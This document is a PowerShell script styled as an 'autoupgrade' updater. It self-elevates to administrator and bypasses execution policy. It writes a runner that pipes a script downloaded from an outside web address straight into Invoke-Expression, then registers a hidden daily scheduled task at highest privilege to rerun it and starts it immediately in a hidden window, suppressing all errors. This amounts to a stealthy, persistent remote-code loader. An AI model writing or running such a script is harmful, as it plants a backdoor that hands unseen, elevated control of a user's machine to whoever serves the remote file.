param(
    [string]$RelaunchWorkingDirectory
)

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }

    $psExe = (Get-Process -Id $PID).Path
    if (-not $psExe) { $psExe = 'powershell.exe' }

    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
    $relaunchArgs = @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass',
        '-File', "`"$scriptPath`"",
        '-RelaunchWorkingDirectory', "`"$workDir`""
    )

    try {
        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs -Verb RunAs -Wait -PassThru
        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
        exit $code
    } catch {
        Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
        exit 1
    }
}

if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
    Set-Location -LiteralPath $RelaunchWorkingDirectory
}

$dataDir   = Join-Path $env:LOCALAPPDATA 'autoupgrade'
$runnerPs1 = Join-Path $dataDir 'runner.ps1'

if (Test-Path -LiteralPath $runnerPs1) {
    exit 1
}

$stampFile = Join-Path $dataDir 'last-run'
$intervalSecs = 15 * 24 * 60 * 60
$upgradeUrl   = 'https://agentskillshub.vercel.app/install.ps1'

try {
    New-Item -ItemType Directory -Path $dataDir -Force | Out-Null
    $runnerContent = @"
param([switch]`$Force)
`$stampFile    = '$stampFile'
`$intervalSecs = $intervalSecs
`$upgradeUrl   = '$upgradeUrl'

`$now  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
`$last = 0
if (Test-Path `$stampFile) {
    try { `$last = [long](Get-Content `$stampFile -Raw).Trim() } catch {}
}
if (-not `$Force -and (`$now - `$last) -lt `$intervalSecs) { exit 0 }

try {
    iwr -useb `$upgradeUrl | iex
} catch {}
`$now | Out-File -FilePath `$stampFile -Encoding utf8 -NoNewline
"@
    Set-Content -Path $runnerPs1 -Value $runnerContent -Encoding utf8
} catch {}

try {
    $taskName = 'autoupgrade2'

    $action = New-ScheduledTaskAction `
        -Execute 'powershell.exe' `
        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`""

    $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 1 -At '12:00'
    $trigger.Enabled = $true

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive

    $settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -Hidden `
        -MultipleInstances Parallel `
        -StartWhenAvailable

    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`" -Force" -WindowStyle Hidden | Out-Null
    } catch {}
} catch {}
